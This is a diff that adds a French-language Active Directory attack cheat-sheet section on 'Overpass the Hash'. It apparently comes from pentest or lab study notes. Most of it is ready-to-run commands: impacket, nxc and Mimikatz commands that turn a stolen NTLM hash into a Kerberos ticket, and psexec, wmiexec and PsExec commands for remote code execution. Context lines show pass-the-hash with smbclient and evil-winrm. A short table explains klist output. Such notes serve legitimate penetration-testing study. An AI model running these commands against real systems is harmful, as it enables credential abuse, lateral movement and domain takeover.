@@ -121,3 +121,58 @@ smbclient \\\\<IP_CIBLE>\\<SHARE> -U Administrator --pw-nt-hash '<NTLM_HASH>'
 evil-winrm -i <IP_CIBLE> -u Administrator -H '<NTLM_HASH>'
 ```
 
+## Overpass the Hash
+
+Convertit un **hash NTLM** en **TGT Kerberos**. Utile quand NTLM est bloqué, ou pour utiliser des outils Kerberos uniquement (PsExec Sysinternals original, etc.).
+
+> Le KDC délivre ensuite les TGS automatiquement à partir du TGT pour chaque service demandé.
+
+**Linux**
+
+Obtenir le TGT
+
+```bash
+# impacket
+impacket-getTGT corp.com/<user> -hashes :<NTLM_HASH> -dc-ip <IP_DC>
+
+# nxc
+nxc smb <IP_DC> -u <user> -H <NTLM_HASH> --generate-tgt /tmp/<user>.ccache
+```
+
+Utiliser le TGT
+
+```bash
+export KRB5CCNAME=/tmp/<user>.ccache
+
+# impacket (-target-ip si le hostname ne résout pas sur Kali)
+impacket-psexec -k -no-pass corp.com/<user>@<HOSTNAME> -dc-ip <IP_DC> -target-ip <IP_CIBLE>
+impacket-wmiexec -k -no-pass corp.com/<user>@<HOSTNAME> -dc-ip <IP_DC> -target-ip <IP_CIBLE>
+
+# nxc
+nxc smb <IP_CIBLE> -u <user> -k --use-kcache
+```
+
+**Windows (Mimikatz)**
+
+```
+sekurlsa::pth /user:<user> /domain:corp.com /ntlm:<NTLM_HASH> /run:powershell
+```
+
+Spawne un PowerShell. Déclencher un AS-REQ pour générer le TGT en mémoire :
+
+```powershell
+net use \\<HOSTNAME>   # force l'obtention du TGT
+klist                  # vérifier
+.\PsExec.exe \\<HOSTNAME> cmd
+```
+
+**Lire la sortie de `klist`**
+
+| Champ | TGT | TGS |
+|---|---|---|
+| `Server` | `krbtgt/CORP.COM` | `cifs/files04`, `http/web04`… |
+| `Ticket Flags` | contient `initial` | pas de flag `initial` |
+| Obtenu via | AS-REQ (1ère étape) | TGS-REQ (échange du TGT) |
+
+> `forwardable` = le ticket peut être transmis à un autre service (attention en contexte de délégation Kerberos non contrainte).
+
